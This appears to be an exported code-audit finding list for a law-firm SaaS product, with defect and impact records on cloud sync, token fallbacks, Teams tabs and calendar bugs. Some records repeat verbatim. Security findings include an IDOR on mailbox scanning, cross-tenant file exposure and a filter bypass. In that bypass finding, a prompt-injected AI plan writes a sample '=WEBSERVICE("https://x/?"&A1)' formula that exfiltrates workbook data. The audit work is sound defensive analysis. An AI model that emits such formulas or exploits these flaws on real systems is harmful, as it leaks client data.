defect_batches.title: Deleting a Shared Drive matter document omits supportsAllDrives (file orphaned) and My Drive deletes bypass trash
defect_batches.claim: _delete_cloud_provider_object (matter_documents.py:261-289) issues DELETE files/{id} without supportsAllDrives=true, unlike the staged-cleanup path (matter_file_store.py:431-435); a Shared Drive item likely 404s, ProviderNotFound is treated as success and the DB record is removed (matter_documents.py:347-348). For My Drive, files.delete is permanent (Graph DELETE goes to the recycle bin). Deleted documents may persist in the Shared Drive, and accidental deletes cannot be recovered. PLAUSIBLE; confirm 404 against a live Shared Drive.

defect_batches.title: Filenames containing '#' or '%' break path-based OneDrive/SharePoint uploads
defect_batches.claim: The filename is interpolated unencoded into ':/{filename}:/content' (matter_file_store.py:866-871), createUploadSession (925) and the SharePoint path (1384-1387); '#' starts a URL fragment, truncating the path and dropping conflictBehavior. The inbound attachment sanitizer keeps '#' and '%' (inbound_email.py:271-283) and failures are logged and swallowed (inbound_email.py:386-400), so attachments like 'Exhibit #3.pdf' silently fail to file.

defect_batches.title: nginx forbids framing of /teams, so Teams tabs render as 'refused to connect'
defect_batches.claim: Server-level X-Frame-Options SAMEORIGIN and CSP frame-ancestors 'self' (nginx.conf:412-415) are inherited by location / (nginx.conf:690-700; again 763-768 and 1037 for :443), which serves the SPA /teams routes (App.jsx:346-353) that the committed Teams manifest targets (teams-app/manifest.json:25-51). Unlike /office/ (nginx/snippets/office_addin.conf:26) there is no /teams exception allowing teams.microsoft.com/*.teams.microsoft.com/*.cloud.microsoft ancestors, so both the personal and configurable tabs are blank in Teams.

defect_batches.title: Teams tabs depend on the SPA's SameSite=Lax cookie session with no Teams SSO exchange
defect_batches.claim: TeamsTabPage/TeamsTabConfigPage sit behind ProtectedRoute (App.jsx:195-197, 346-353), which redirects unauthenticated users to /login inside the Teams iframe. Auth cookies default to SameSite=Lax (config.py:60) and are not sent in a cross-site iframe. webApplicationInfo is declared (teams-app/manifest.json:48-51) but no code calls microsoftTeams.authentication.getAuthToken and routers/teams.py has no token-exchange endpoint (TASKS 1403 pending). Even after the framing fix, users hit a login page that cannot complete in the iframe.

defect_batches.title: Committed teams-app/lawhand-teams.zip is stale (old domain and Entra app id) and not rebuilt by CI
defect_batches.claim: The manifest inside the tracked teams-app/lawhand-teams.zip points at legalapp.perevagagroup.com and webApplicationInfo id c805316c-..., while teams-app/manifest.json (6-51) uses getlawhand.com and 062a7776-.... CI never rebuilds it, package.ps1 needs Windows (System.Drawing), TASKS 1402 says 'do not commit the zip' yet it is tracked and still marked PENDING (TASKS.md:2371-2378), and TASKS.md:146 is open. An admin who uploads the checked-in zip installs an app that loads the wrong host.

defect_batches.title: Teams channel-tab save reports success without creating a working tab
defect_batches.claim: TeamsTabConfigPage calls setConfig only via window.microsoftTeams (TeamsTabConfigPage.jsx:69), which the ESM @microsoft/teams-js v2 import (line 2) does not define as a global; saveConfiguration swallows its own errors (79), so registerOnSaveHandler always calls notifySuccess (90) even when createTeamsLink failed. Admins can save a channel tab with no content URL or matter link and see no error.

defect_batches.title: Teams personal tab shows 'No channels linked' to every non-admin
defect_batches.claim: GET /links goes through require_teams_enabled, which requires the admin role (teams_gate.py:64-66; routers/teams.py:155-157); TeamsTabPage.jsx:10-12 swallows the 403 and renders an empty list, so attorneys and staff conclude no matter channels exist.

defect_batches.title: Teams notification cards are posted as the consenting admin, not a bot
defect_batches.claim: teams_notify.py:150-171 posts cards with delegated ChannelMessage.Send (teams.py:401-406) using the consenting user's or tenant credential's token; there is no bot identity, so deadline alerts appear 'from' a partner.

defect_batches.title: Filled sample documents uploaded as template sources stay on LawHand host disk
defect_batches.claim: Template intake invites filled samples (TemplatesPage.jsx:843) and document_templates.py:760-790 persists these originals under UPLOAD_DIR, whereas matter files go to the customer's own cloud (matter_file_store.py:1-8). Client PII stays outside the firm's retention/eDiscovery controls.

defect_batches.title: MCP/workflow template render ignores Studio conditional and repeating regions
defect_batches.claim: render_workspace_template (document_template_workspace.py:274-284) calls fill_docx_template without collections= or regions=, whereas the in-app render passes collections=_repeat_collections(parties) and regions=stored_regions(schema) (document_templates.py:4687-4698). Studio regions exist only in the field map (template_regions.py:1-12), so drafts produced by external assistants or workflows include every if/unless clause and do not expand per-party sections: the same template yields different legal text depending on the render path.

defect_batches.title: Backend container lacks metric-compatible Office fonts for DOCX-to-PDF signing copies
defect_batches.claim: backend/Dockerfile:27-36 installs only fonts-liberation and fonts-nanum; there is no Carlito/Caladea (Calibri/Cambria metrics) or Aptos substitute, and the team's validation does not certify production LibreOffice conversion (docs/template-studio-word-source-review.md:62). Signed PDFs can reflow, moving signature captions across pages.

defect_batches.title: Live DOCX-to-PDF preview spawns unbounded LibreOffice processes in the API worker
defect_batches.claim: The render-file preview calls docx_to_pdf_bytes per request with no semaphore or queue (document_templates.py:3510-3523); only the source-preview cache is single-flight (template_source_preview.py:35-37). Auto-preview re-fires 650 ms after typing (usePrepareFill.js:13, 79, 425-428), and each conversion starts soffice with up to 60 s timeout (docx_to_pdf.py:92-116), so concurrent users can exhaust API CPU/memory.

defect_batches.title: Shared platform Google service account can surface other tenants' Shared Drive files
defect_batches.claim: One platform service account (GOOGLE_SERVICE_ACCOUNT_KEY) is added as fileOrganizer to every Workspace tenant's auto-created Shared Drive (cloud_init.py:1214-1244). When no per-user Google grant exists or no user_id is passed (admin test search cloud_admin.py:465, tenant sync_all), cloud_search._get_google_token (cloud_search.py:1516-1527) and cloud_sync._get_token (cloud_sync.py:833-864) return the service-account token. _search_google_drive then queries corpora=allDrives with no driveId when there is no matter folder (cloud_search.py:666-676), fetch_contents downloads the hits (1098-1138), and there is no post-filter on drive_id (333-347). The prefer_service_account probe (google_service_account.py:213-258) only checks access to this tenant's drive and does not scope the query. Result: firm A's chat or index can include firm B's Shared Drive titles and content, a cross-tenant confidentiality breach.

defect_batches.title: Live cloud search/fetch falls back to the connecting admin's delegated token for every user
defect_batches.claim: cloud_search._get_microsoft_token (cloud_search.py:1529-1543) and _get_google_token (1516-1527) fall back to token_vault.get_fresh_token (the tenant credential, i.e. the delegated refresh token of the admin who connected) when the requesting user has no personal grant. rag._connected_providers treats that tenant credential as connected for every user (rag.py:344-376) and RAG calls connected-source search for any user (rag.py:1889-1906). Consequently Graph /search/query message hits search the admin's mailbox (cloud_search.py:941-986) and _fetch_outlook_content downloads full MIME from /me/messages/{id}/$value (1329-1362); driveItem search returns anything the admin can see; Gmail search (751-850) and full-body fetch (1140-1167) are not matter-scoped; matter-scoped searches still keep 'outlook' in the global query (_microsoft_sources_without_scoped, 1745-1764). Any firm user's chat can therefore return the admin's private email bodies and OneDrive/SharePoint/Drive files, bypassing provider permissions and ethical walls. The Hub copy's 'Confirm the ... mailbox boundary' (IntegrationsHub.jsx:100) has no backing control.

defect_batches.title: Scheduled cloud sync indexes the admin's personal mailbox into the tenant-wide search index
defect_batches.claim: sync_all calls sync_outlook_mail(db, tenant_id) with no user_id (cloud_sync.py:153-160), so _get_token uses the tenant (admin) delegated token and /me/messages is the admin's mailbox (cloud_sync.py:725-830); the 200 newest subjects, participants and 500-char bodyPreview are upserted into cloud_metadata_index. The Gmail path does the same for the admin's last 7 days of mail (cloud_sync.py:128-134, 455-568; also noted in google#D1 and sync#D1). search_index filters only on tenant_id and provider/object_type (cloud_search.py:471-507) with no owner ACL, RAG calls it for every user (rag.py:1889-1905), and the scheduler runs it on an interval (scheduler.py:804-810). Partner/HR/privileged mail subjects and snippets become retrievable by every user.

defect_batches.title: Task calendar pushes write every assignee's deadlines into the connecting admin's calendar
defect_batches.claim: google_calendar._get_token (google_calendar.py:18-38) and microsoft_calendar._get_token (microsoft_calendar.py:23-44) return the tenant (admin) token whenever the assignee has no per-user token or its refresh fails, because upsert_task_event does not pass exact_user. push_task_to_calendars fires upsert_task_event to both providers for every dated task (task_notifications.py:270-317), so events land in the admin's /me/events or primary calendar (microsoft_calendar.py:132-181). Titles/descriptions include matter and client names. The assignee gets nothing, revocation is masked, and the admin's calendar (and anyone it is shared with) sees other lawyers' matters, including walled ones.

defect_batches.title: Approved client email falls back to sending from the connecting admin's mailbox
defect_batches.claim: When the approver has no per-user grant, connected_mail uses the tenant credential (the admin's delegated token) with /me/sendMail and saveToSentItems=True (connected_mail.py:381-420); there is no shared-mailbox support (Mail.Send.Shared or /users/{shared}/sendMail). Clients receive correspondence from the managing partner's address, it lands in that partner's Sent Items, and replies go to the wrong person.

defect_batches.title: Gmail sync/search uses the Drive-only service-account token on org Shared Drive tenants and silently returns nothing
defect_batches.claim: cloud_sync._get_token applies prefer_service_account to every Google call, not just Drive (cloud_sync.py:833-864, esp. 854-864); the service-account token carries only DRIVE_SCOPES and no domain-wide-delegation subject (google_service_account.py:213-243). Gmail rejects it with 403, sync_gmail_metadata returns 0 without raising (cloud_sync.py:494-501), and Gmail search through cloud_search._get_google_token gets the same swap. Workspace firms on the default Shared Drive path never get Gmail indexed or searched and see a successful 0-item sync.

defect_batches.title: get_fresh_token holds a FOR UPDATE lock on the tenant token row for the caller's whole transaction
defect_batches.claim: get_fresh_token takes SELECT ... FOR UPDATE (token_vault.py:196-209) and returns without committing on the fresh-token path (token_vault.py:413-432). Concurrent requests needing the same tenant credential (every no-personal-token user in RAG/search) wait on lock_timeout=5s, after which _execute_locked_scalar returns None and the provider reads as 'not connected'. Microsoft sources intermittently drop out of answers under concurrent load. PLAUSIBLE from code reading.

defect_batches.title: Document Open links use the stored web URL instead of the /open resolver
defect_batches.claim: MatterDocumentsTab.jsx:1140, 1280, 1406 link to doc.cloud_url (persisted storage_path) rather than /matters/{m}/documents/{d}/open, which resolves a fresh editing URL from durable IDs (matter_documents.py:719-747) and is already used by ActionProposalCard.jsx:584-586. After a rename/move in SharePoint/OneDrive, Open 404s.

defect_batches.title: Documents tab repeats the slowest live cloud search
defect_batches.claim: MatterDocumentsTab.jsx:407-413 calls getMatterCloudFiles on mount although MatterDetailPage already ran it ('by far the slowest request', MatterDetailPage.jsx:569-575), and swallows errors.

defect_batches.title: Correspondence load failure renders as an empty archive
defect_batches.claim: MatterCorrespondenceTab.jsx:570-573 does .catch(() => setItems([])), rendering 'No correspondence captured yet. Configure capture rules, then click Scan now' (683-689) on API/permission errors.

defect_batches.title: SharePoint-backed matters appear unprovisioned and their documents are labelled 'Local'
defect_batches.claim: storageLabel() has no 'sharepoint' case and returns 'Local' (MatterDocumentsTab.jsx:68-73), and CloudFolderCard treats a matter as provisioned only if providers.onedrive or providers.google_drive exists (MatterDocumentsTab.jsx:157-165), although the backend stores cloud_folder['sharepoint'] and storage_backend='sharepoint' (cloud_init.py:510-588; matter_file_store.py:1360-1425). MatterDetailPage.jsx:144-161 skips SharePoint and labels any non-OneDrive folder 'Google Drive'; MatterSmbSharesTab.jsx:52-55, 227 omit it too. SharePoint firms see 'Document folders are not set up', a 'Set up folders' prompt, 'Open in Local' rows, a LOCAL chip and a 'Saved to Local' toast (MatterDocumentsTab.jsx:440-445).

defect_batches.title: No per-user disconnect for personal Microsoft/Google connections
defect_batches.claim: The Microsoft and Google disconnect endpoints (integrations.py:2105-2167) are admin-only and delete every user's UserOAuthToken for the tenant; unlike Zoom's per-user disconnect (integrations.py:2368-2391), there is no self-service endpoint or frontend control (api.js exposes only Zoom/QBO helpers, api.js:900-914, 2840). An attorney cannot revoke LawHand's Mail.Read/Mail.Send/Files access to their own mailbox without an admin disconnecting the whole firm.

defect_batches.title: 'Connect in Admin > Integrations' is a silent dead end for non-admin users
defect_batches.claim: The empty Cloud Files state calls navigate('/admin') (MatterDetailPage.jsx:1302-1309), but /admin is a financeOnly ShellRoute (App.jsx:490-491) and ProtectedRoute redirects users without finance access to their default route (App.jsx:210-212). Other non-actionable admin pointers: CloudFolderCard copy (MatterDocumentsTab.jsx:219-223), StorageReadinessNotice.jsx:30, and the send error 'Reconnect ... in Integrations' (connected_mail.py:233-239).

defect_batches.title: 'Connect Calendar' button silently requests mailbox read/send and full file access
defect_batches.claim: The CalendarPage button 'Connect Calendar' / 'Connect your calendar to sync events' (CalendarPage.jsx:862-871) redirects immediately (778-781) to intent=user, which requests MICROSOFT_USER_SCOPES 'offline_access User.Read Mail.Read Mail.Send Files.ReadWrite.All Calendars.ReadWrite' or Google gmail.readonly, gmail.send, calendar and drive (integrations.py:256-265), with no explainer before consent.

defect_batches.title: Matter cloud 'connected' is true when any tenant credential exists, including Zoom
defect_batches.claim: _build_matter_cloud_files_response returns connected=True if any active TenantCredential exists, including zoom/zoom_phone (matters.py:227-235; integrations.py:978, 1183-1185). The UI then shows 'Connected', a 'Cloud' badge on every conversation and 'Cloud context active — AI chats here have access to matter files from your connected OneDrive, SharePoint, and Google Drive' (MatterDetailPage.jsx:99-103, 1279-1283, 1809-1815).

defect_batches.title: Matter cloud-file errors are shown as 'no files' or 'not connected'
defect_batches.claim: Any fetch error sets {connected:false} and renders 'No cloud integrations connected' (MatterDetailPage.jsx:560-567); a backend search exception such as an expired token returns {files:[], connected:true} (matters.py:259-263), rendering 'No cloud files found matching this matter.' (MatterDetailPage.jsx:1310-1313); MatterDocumentsTab.jsx:407-413 also swallows errors. No reconnect action is shown.

defect_batches.title: Calendar move/delete always claims the connected calendar was updated, ignoring the provider result
defect_batches.claim: After updateScheduledEvent the UI always shows 'Moved ... and updated the connected calendar.' (CalendarPage.jsx:684-687), ignoring the sync_status/external_calendar_event_id/calendar_provider the PATCH returns (calendar.py:481-497) and showing it even for local-only events; syncMessageForScheduledEvent (CalendarPage.jsx:294) is not reused. Delete always says 'Event deleted from LawHand and its connected calendar.' (CalendarPage.jsx:819-823) while delete_external_event discards the boolean from ms_delete_event/google_delete_event (scheduled_events.py:125-143; calendar_sync.py:306-320) and the route returns 204 regardless (calendar.py:501-521). Attorneys believe external meetings moved or were cancelled when they were not.

impact_batches.title: Re-authorize for Personal-Google tenants always fails and bounces the admin into onboarding
impact_batches.claim: IntegrationsPanel.handleReauthorize (IntegrationsPanel.jsx:174-181) calls /integrations/google/connect?intent=admin without account_mode; the backend defaults to 'workspace' (integrations.py:658-662) and requests the directory scope, and the callback rejects the personal account with account_mode_mismatch (integrations.py:798-800). _error_redirect then sends all admin errors to /onboarding (integrations.py:1790-1807). A solo/personal-Gmail firm with a revoked token cannot repair it from Admin > Cloud.

impact_batches.title: Workspace MCP OAuth supports only public clients, blocking Microsoft 365 Copilot and Gemini Enterprise
impact_batches.claim: AS metadata advertises token_endpoint_auth_methods_supported=['none'] (workspace_mcp_oauth.py:297); DCR rejects any other method and never returns a client_secret (313-404, esp. 350-363), and no admin/operator path creates a static confidential client (WorkspaceMCPClient is only created by DCR). Microsoft 365 Copilot MCP plugins require DCR that issues a secret and Gemini Enterprise requires client_id+client_secret, so ECO-09/12/21 are blocked; the ecosystem plan still lists this as existing leverage (docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:63).

impact_batches.title: Microsoft admin connect omits openid, so tier stays 'unknown' and Entra directory sync is permanently blocked
impact_batches.claim: MICROSOFT_ADMIN_SCOPES (integrations.py:241-244) lacks openid/profile, so the admin callback (integrations.py:568-615) receives no id_token; claims is None, detect_microsoft(None) returns ('unknown', None), and apply_detection still stamps account_detected_at (account_detect.py:184-189), so backfill_unknown_credentials skips the row forever (account_detect.py:140-141). capabilities._directory_sync returns unavailable for an unknown tier (capabilities.py:98-103) and user_sync._directory_sync_blocked turns every Microsoft sync into not_applicable (user_sync.py:122-124). service_account_email is never set, so send_admin_notification never uses Graph (email_admin.py:106) and 'Granted by' is blank. Reconnecting cannot fix it; no test covers the MS admin callback token response.

impact_batches.title: Moved or renamed matter key dates leave stale events on Outlook/Google calendars
impact_batches.claim: Key-date pushes (calendar_sync.py:519-628) store no provider event id and dedupe on (subject, start date) read back from the provider. When a key date moves or the matter is renamed, a new event is created and the old one is never updated or deleted, so lawyers see the old court date beside the new one (missed-deadline risk).

impact_batches.title: Date-only task events are sent to Google Calendar with an empty (end == start) range
impact_batches.claim: google_calendar.py:52-53 sends all-day events with end.date == start.date, but Google's end.date is exclusive, so the range is empty; the Graph path correctly adds one day (microsoft_calendar.py:83-96). The failure is only logged (google_calendar.py:159-166) inside fire-and-forget code (task_notifications.py:36-50), and the unit test encodes end == start. Most deadlines (no due time) never reach Google Calendar and nobody is told. Needs live-API confirmation.

impact_batches.title: Directory sync re-activates admin-deactivated users, and their mailboxes keep being captured
impact_batches.claim: Every directory match sets user_row.is_active = True unconditionally (user_sync.py:175-181 for Microsoft, 321-327 for Google; also ms-graph#D7 at 170-173). Admin deactivation (admin.py:300-306) does not delete or revoke UserOAuthToken rows, and run_correspondence_capture iterates all token rows with no User.is_active or token-health filter (scheduler.py:1894-1916). A deactivated user is restored at the nightly directory sync and their mail is archived into matters every 30 minutes.

impact_batches.title: Directory sync never deprovisions disabled/suspended/deleted accounts and licenses guests and resource mailboxes
impact_batches.claim: Microsoft GET /users (user_sync.py:130-202) has no userType/assignedLicenses $filter and $select omits userType, so guests, rooms and shared mailboxes become role 'user' with license_active=True; accountEnabled=false only skips creation and never deactivates existing users (user_sync.py:154-156), and deleted users are never reconciled. The Google path (user_sync.py:305-351) skips suspended accounts instead of setting is_active=False, ignores deleted users, and creates every account license_active=True (346). Departed staff stay active and consume paid seats; external guests (clients/co-counsel in Teams) become licensed LawHand users. The Microsoft half is latent while the tier bug (ms-graph#D0) blocks MS sync, but live for Google and legacy MS credentials.

impact_batches.title: /api/email/scan lets any user scan another user's mailbox via body.user_id
impact_batches.claim: email_agent.py:31-65 sets user_id = str(user.id) if not body.user_id else body.user_id with no admin or ownership check; process_emails then loads that user's delegated mail token (email_agent.py:348-364). A paralegal can POST {user_id: partnerId} and receive the partner's inbox subjects, senders, AI summaries and drafted replies, and the scan writes notes/tasks attributed to the partner (IDOR).

impact_batches.title: Excel set_selected_values bypasses the unsafe-formula ban
impact_batches.claim: office_action_policy.py:168-183 checks set_selected_values only for JSON scalar type (53-57); the WEBSERVICE/HYPERLINK/external-reference regex (31-35) runs only for set_selected_formulas (185-203). The client writes range.values directly (office-addin/src/hosts/excelAdapter.ts:102), and Excel interprets a value starting with '=' as a formula; validation.ts:99-102 does not check values either. A prompt-injected plan can write '=WEBSERVICE("https://x/?"&A1)' to exfiltrate workbook data.

impact_batches.title: Office add-in cookie session fails in Office on the web and new Outlook (SameSite=Lax in cross-site iframe)
impact_batches.claim: The Office token exchange sets HTTP-only cookies (auth.py:1788-1790) with SameSite from _cookie_flags (auth.py:483-499; default lax, config.py:60), then the pane re-reads /auth/me with credentials (office-addin/src/auth/officeSession.ts:72-99). As the code's own comment (officeSession.ts:73-77) notes, the Lax cookie is not sent cross-site; on web hosts the pane is iframed under office.com / cloud.microsoft, so the pane shows 'Office sign-in completed without a LawHand session'. Only classic desktop clients work.

impact_batches.title: Per-user Microsoft tokens break OneDrive matter-folder search, sync and fetch because folders live in the admin's drive
impact_batches.claim: When a user has a personal Microsoft token it is preferred, and folder search, sync and content fetch call /me/drive/items/{adminFolderId}/... (cloud_search.py:1399-1435, esp. 1412; 1182-1184; cloud_sync.py:596-620). For an item in another user's drive Graph returns itemNotFound; _sync_graph_files logs and breaks (cloud_sync.py:1058-1064), and the matter 'Sync folder' route (matters.py:3407-3413) reports 'synced' with 0 files. Users who followed 'Connect Calendar' get empty matter cloud files and AI answers without matter documents, while unconnected users get results via the admin token. Fix requires drive-qualified paths (/drives/{driveId}/items/...).

impact_batches.title: After any storage migration, every scheduled sync force-rewalks the whole cloud tree and rewrites the index
impact_batches.claim: sync_all and sync_matter_folders call storage_migration_reindex.run(force=True) on every run (cloud_sync.py:80-111). That BFS makes one Graph/Drive call per folder plus marker downloads with no 429 handling (storage_discovery.py:233-298), then deletes and re-upserts all file rows (storage_migration_reindex.py:130-143). Any failure raises RuntimeError before mail sync runs (cloud_sync.py:85-88). Firms with thousands of matter folders make thousands of API calls every interval, get throttled, and all cloud sync (including mail metadata) fails continuously.

impact_batches.title: Microsoft Auto mode stores firm matter files in the connecting admin's personal OneDrive
impact_batches.claim: In Auto mode an active Microsoft connection binds storage to 'onedrive' (matter_file_store.py:150-153, 199-204; integrations.py:1996-2002). Every admin connect creates the LawHand root in the admin's /me/drive via _ensure_cloud_root (integrations.py:2398-2438; cloud_init.py:148-166, 1506-1508), and all reads/writes use the tenant delegated token against /me/drive/items/{parent} (matter_file_store.py:42-56, 832, 866-871). No sharing to other firm users exists on the OneDrive path, so 'Open cloud copy'/co-authoring is access-denied for other staff; storage_root_ownership rates it at_risk but only surfaces that in onboarding, contradicting the org-owned-root design (docs/storage-root-ownership-and-handoff.md:12-14, 28). When the admin leaves, is disabled or hits Conditional Access, all matter storage fails, and OneDrive retention after account deletion can destroy firm records.

impact_batches.title: Removing a matter assignee never revokes the cloud folder share granted to them
impact_batches.claim: Assignees are invited with write roles via /me/drive/items/{id}/invite (cloud_init.py:617-697, called from matters.py:185-218, 3095, 3188, 3263, 3402), but remove_assignment (matters.py:1772-1825) deletes the row and cleans calendars without calling DELETE .../permissions/{id}; the codebase has no unshare function. A lawyer screened off a matter keeps write access to its OneDrive/SharePoint/Drive folder indefinitely.

impact_batches.title: Editing a matter document in Word/Drive (as the UI invites) permanently breaks LawHand access with a 409
impact_batches.claim: Download reads cloud bytes with expected_size=doc.file_size (matter_documents.py:750-806) and read_matter_file_bytes enforces the stored size (matter_file_store.py:233-242, 1543-1551), so any edit via the 'Open in OneDrive/Google Drive' link (MatterDocumentsTab.jsx:1139-1147, 1278-1287) raises an integrity error, marks storage_state='conflict' and 409s every later download. E-sign creation reads with the same check (esignature.py:449-456). Folder sync never updates MatterDocument size/hash and only task-bound AI drafts have an adopt endpoint (tasks.py:1906), while the upload toast says 'Edits happen in the firm's cloud copy' (MatterDocumentsTab.jsx:440-444). Edited documents can no longer be downloaded, signed or fed to AI.

impact_batches.title: Template/agent DOCX drafts default to plain-text edit mode; a save flattens formatting and truncates at 50k chars
impact_batches.claim: propose_document_from_template and propose_matter_document_file build MatterDocumentDraftAction without document_edit_mode (chat_tools/handlers.py:1835-1850), so it defaults to 'lawhand_text' (schemas/chat_action.py:439); only the cloud-sync path sets 'office_snapshot' (tasks.py:2109). A text save (tasks.py:1806-1835) creates a revision from the extracted preview (capped at 50k chars) and re-renders via render_revision_docx with python-docx default styles (cloud_artifact_materialization.py:260-270, 435-440). This contradicts docs/workspace_mcp_adapter.md:489-491 (snapshots stay read-only so a save cannot flatten formatting). A typo fix strips letterhead, tables, headers/footers and drops content past ~50k chars, and approval binds to the damaged DOCX. Behind WORKSPACE_MCP_ENABLED/workflow runs.

impact_batches.title: nginx forbids framing of /teams, so Teams tabs render as 'refused to connect'
impact_batches.claim: Server-level X-Frame-Options SAMEORIGIN and CSP frame-ancestors 'self' (nginx.conf:412-415) are inherited by location / (nginx.conf:690-700; again 763-768 and 1037 for :443), which serves the SPA /teams routes (App.jsx:346-353) that the committed Teams manifest targets (teams-app/manifest.json:25-51). Unlike /office/ (nginx/snippets/office_addin.conf:26) there is no /teams exception allowing teams.microsoft.com/*.teams.microsoft.com/*.cloud.microsoft ancestors, so both the personal and configurable tabs are blank in Teams.

impact_batches.title: Teams tabs depend on the SPA's SameSite=Lax cookie session with no Teams SSO exchange
impact_batches.claim: TeamsTabPage/TeamsTabConfigPage sit behind ProtectedRoute (App.jsx:195-197, 346-353), which redirects unauthenticated users to /login inside the Teams iframe. Auth cookies default to SameSite=Lax (config.py:60) and are not sent in a cross-site iframe. webApplicationInfo is declared (teams-app/manifest.json:48-51) but no code calls microsoftTeams.authentication.getAuthToken and routers/teams.py has no token-exchange endpoint (TASKS 1403 pending). Even after the framing fix, users hit a login page that cannot complete in the iframe.

impact_batches.title: MCP/workflow template render ignores Studio conditional and repeating regions
impact_batches.claim: render_workspace_template (document_template_workspace.py:274-284) calls fill_docx_template without collections= or regions=, whereas the in-app render passes collections=_repeat_collections(parties) and regions=stored_regions(schema) (document_templates.py:4687-4698). Studio regions exist only in the field map (template_regions.py:1-12), so drafts produced by external assistants or workflows include every if/unless clause and do not expand per-party sections: the same template yields different legal text depending on the render path.

impact_batches.title: Shared platform Google service account can surface other tenants' Shared Drive files
impact_batches.claim: One platform service account (GOOGLE_SERVICE_ACCOUNT_KEY) is added as fileOrganizer to every Workspace tenant's auto-created Shared Drive (cloud_init.py:1214-1244). When no per-user Google grant exists or no user_id is passed (admin test search cloud_admin.py:465, tenant sync_all), cloud_search._get_google_token (cloud_search.py:1516-1527) and cloud_sync._get_token (cloud_sync.py:833-864) return the service-account token. _search_google_drive then queries corpora=allDrives with no driveId when there is no matter folder (cloud_search.py:666-676), fetch_contents downloads the hits (1098-1138), and there is no post-filter on drive_id (333-347). The prefer_service_account probe (google_service_account.py:213-258) only checks access to this tenant's drive and does not scope the query. Result: firm A's chat or index can include firm B's Shared Drive titles and content, a cross-tenant confidentiality breach.

impact_batches.title: Live cloud search/fetch falls back to the connecting admin's delegated token for every user
impact_batches.claim: cloud_search._get_microsoft_token (cloud_search.py:1529-1543) and _get_google_token (1516-1527) fall back to token_vault.get_fresh_token (the tenant credential, i.e. the delegated refresh token of the admin who connected) when the requesting user has no personal grant. rag._connected_providers treats that tenant credential as connected for every user (rag.py:344-376) and RAG calls connected-source search for any user (rag.py:1889-1906). Consequently Graph /search/query message hits search the admin's mailbox (cloud_search.py:941-986) and _fetch_outlook_content downloads full MIME from /me/messages/{id}/$value (1329-1362); driveItem search returns anything the admin can see; Gmail search (751-850) and full-body fetch (1140-1167) are not matter-scoped; matter-scoped searches still keep 'outlook' in the global query (_microsoft_sources_without_scoped, 1745-1764). Any firm user's chat can therefore return the admin's private email bodies and OneDrive/SharePoint/Drive files, bypassing provider permissions and ethical walls. The Hub copy's 'Confirm the ... mailbox boundary' (IntegrationsHub.jsx:100) has no backing control.

impact_batches.title: Scheduled cloud sync indexes the admin's personal mailbox into the tenant-wide search index
impact_batches.claim: sync_all calls sync_outlook_mail(db, tenant_id) with no user_id (cloud_sync.py:153-160), so _get_token uses the tenant (admin) delegated token and /me/messages is the admin's mailbox (cloud_sync.py:725-830); the 200 newest subjects, participants and 500-char bodyPreview are upserted into cloud_metadata_index. The Gmail path does the same for the admin's last 7 days of mail (cloud_sync.py:128-134, 455-568; also noted in google#D1 and sync#D1). search_index filters only on tenant_id and provider/object_type (cloud_search.py:471-507) with no owner ACL, RAG calls it for every user (rag.py:1889-1905), and the scheduler runs it on an interval (scheduler.py:804-810). Partner/HR/privileged mail subjects and snippets become retrievable by every user.

impact_batches.title: Task calendar pushes write every assignee's deadlines into the connecting admin's calendar
impact_batches.claim: google_calendar._get_token (google_calendar.py:18-38) and microsoft_calendar._get_token (microsoft_calendar.py:23-44) return the tenant (admin) token whenever the assignee has no per-user token or its refresh fails, because upsert_task_event does not pass exact_user. push_task_to_calendars fires upsert_task_event to both providers for every dated task (task_notifications.py:270-317), so events land in the admin's /me/events or primary calendar (microsoft_calendar.py:132-181). Titles/descriptions include matter and client names. The assignee gets nothing, revocation is masked, and the admin's calendar (and anyone it is shared with) sees other lawyers' matters, including walled ones.

impact_batches.title: SharePoint-backed matters appear unprovisioned and their documents are labelled 'Local'
impact_batches.claim: storageLabel() has no 'sharepoint' case and returns 'Local' (MatterDocumentsTab.jsx:68-73), and CloudFolderCard treats a matter as provisioned only if providers.onedrive or providers.google_drive exists (MatterDocumentsTab.jsx:157-165), although the backend stores cloud_folder['sharepoint'] and storage_backend='sharepoint' (cloud_init.py:510-588; matter_file_store.py:1360-1425). MatterDetailPage.jsx:144-161 skips SharePoint and labels any non-OneDrive folder 'Google Drive'; MatterSmbSharesTab.jsx:52-55, 227 omit it too. SharePoint firms see 'Document folders are not set up', a 'Set up folders' prompt, 'Open in Local' rows, a LOCAL chip and a 'Saved to Local' toast (MatterDocumentsTab.jsx:440-445).
